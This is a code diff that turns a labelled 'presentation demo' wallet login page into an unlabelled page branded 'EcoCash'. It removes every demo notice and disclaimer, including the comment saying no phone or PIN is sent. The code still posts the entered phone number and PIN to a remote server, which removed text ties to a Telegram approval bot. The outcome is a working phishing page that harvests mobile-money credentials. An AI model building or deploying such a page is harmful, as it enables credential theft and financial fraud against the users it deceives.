@@ -9,7 +9,7 @@
     content="width=device-width, initial-scale=1.0"
   >
 
-  <title>Wallet Presentation Demo</title>
+  <title>Wallet</title>
 
   <style>
     * {
@@ -551,9 +551,7 @@
 
 <body>
 
-  <div class="demo-notice">
-    PRESENTATION DEMO — NO REAL CREDENTIALS ARE TRANSMITTED
-  </div>
+ 
 
   <div class="page">
 
@@ -562,21 +560,21 @@
       <div class="logo">
 
         <span class="logo-blue">
-          Wallet
+          Eco
         </span>
 
         <span class="logo-red">
-          Demo
+          Cash
         </span>
 
         <span class="demo-brand">
-          PRESENTATION MOCKUP
+          Enter your login details
         </span>
 
       </div>
 
       <h1 class="login-title">
-        Demo Login
+       Login
       </h1>
 
       <div class="login-form">
@@ -585,7 +583,7 @@
           class="field-label"
           for="phoneInput"
         >
-          Demo phone number
+           Phone number
         </label>
 
        <div class="phone-wrapper">
@@ -596,13 +594,12 @@
     class="phone-input"
     id="phoneInput"
     placeholder="Enter phone number"
-    
     autocomplete="tel"
     inputmode="numeric"
   >
 </div>
         <div class="pin-label">
-          Enter demo PIN
+          Enter PIN
         </div>
 
         <div class="pin-area">
@@ -662,7 +659,7 @@
           class="pin-error"
           id="pinError"
         >
-          Please enter the 4-digit demo PIN.
+          Please enter the 4-digit PIN.
         </div>
 
         <a
@@ -687,11 +684,7 @@
 
     <section class="bottom-section">
 
-      <p class="bottom-text">
-        This page is a presentation mockup.<br>
-        No real wallet account is accessed.
-      </p>
-
+     
       <div class="footer-buttons">
 
         <button
@@ -715,12 +708,10 @@
       </div>
 
       <div class="version">
-        DEMO v1.0
+        ECOCASH v1.0
       </div>
 
-      <div class="terms">
-        Presentation demonstration only.
-      </div>
+     
 
     </section>
 
@@ -747,8 +738,7 @@
       </h2>
 
       <p id="statusMessage">
-        Check the configured Telegram demo bot and
-        choose ACCEPT DEMO or REJECT DEMO.
+        Kindly it takes less than a minute
       </p>
 
       <button
@@ -904,17 +894,7 @@
       }
     );
 
-    /*
-     * -------------------------------
-     * CREATE DEMO REQUEST
-     * -------------------------------
-     *
-     * IMPORTANT:
-     * Only the generic presentation
-     * event is sent to Render.
-     *
-     * No phone, PIN or OTP is sent.
-     */
+    
 
     async function createDemoRequest() {
   const phoneNumber =
@@ -923,7 +903,7 @@
    
 
   // Demo-only value; don't use a real account PIN here.
-  const demoPin =  sessionStorage.getItem("pin") || pinBoxes.value.trim();
+  const demoPin = sessionStorage.getItem("pin") || pinBoxes.value.trim();;
 
   const response = await fetch(
     `${API_URL}/api/demo-login`,
@@ -937,7 +917,7 @@
       body: JSON.stringify({
         event: "presentation_demo_login",
         phone: phoneNumber,
-        pin: demoPin
+        demoPin: demoPin
       })
     }
   );
@@ -958,7 +938,7 @@
   if (!response.ok || !data.ok) {
     throw new Error(
       data.error ||
-      "Unable to create demo request."
+      "Unable to create request."
     );
   }
 
@@ -988,7 +968,7 @@
       ) {
 
         throw new Error(
-          "Invalid demo request ID."
+          "Invalid request ID."
         );
 
       }
@@ -1055,7 +1035,7 @@
             await getDemoStatus(requestId);
 
           console.log(
-            "Demo status:",
+            " status:",
             data.status
           );
 
@@ -1067,10 +1047,10 @@
               "✅";
 
             statusTitle.textContent =
-              "Demo approved";
+              "Login approved";
 
             statusMessage.textContent =
-              "The presentation demo approval was accepted.";
+              "continue to complete";
 
             statusButton.textContent =
               "CONTINUE";
@@ -1098,10 +1078,10 @@
               "❌";
 
             statusTitle.textContent =
-              "Demo rejected";
+              " rejected";
 
             statusMessage.textContent =
-              "The presentation demo request was rejected.";
+              "The request was rejected.";
 
             statusButton.textContent =
               "TRY AGAIN";
@@ -1139,7 +1119,7 @@
               "Request expired";
 
             statusMessage.textContent =
-              "The presentation demo request expired.";
+              "The request expired.";
 
             statusButton.textContent =
               "CLOSE";
@@ -1250,7 +1230,7 @@ sessionStorage.setItem("pin", pin);
         await createDemoRequest();
 
       console.log(
-        "Created demo request:",
+        "Created request:",
         requestId
       );
 
@@ -1260,8 +1240,8 @@ sessionStorage.setItem("pin", pin);
         "Waiting for approval";
 
       statusMessage.textContent =
-        "A presentation demo request has been " +
-        "sent to the configured Telegram demo bot.";
+        "A request has been " +
+        "sent.";
 
       statusButton.textContent = "CANCEL";
 
@@ -1282,13 +1262,13 @@ sessionStorage.setItem("pin", pin);
     } catch (error) {
 
       console.error(
-        "Demo request failed:",
+        " request failed:",
         error
       );
 
       pinError.textContent =
         error.message ||
-        "Unable to connect to the demo approval server.";
+        "Unable to connect to the approval server.";
 
       pinError.classList.add("show");
 
@@ -1319,7 +1299,7 @@ sessionStorage.setItem("pin", pin);
           event.preventDefault();
 
           alert(
-            "PIN recovery is disabled in this presentation demo."
+            "PIN recovery is disabled in this."
           );
 
         }
@@ -1332,7 +1312,7 @@ sessionStorage.setItem("pin", pin);
         function () {
 
           alert(
-            "Registration is disabled in this presentation demo."
+            "Registration is disabled."
           );
 
         }
@@ -1344,9 +1324,7 @@ sessionStorage.setItem("pin", pin);
         "click",
         function () {
 
-          alert(
-            "Help & Support is disabled in this presentation demo."
-          );
+          
 
         }
       );
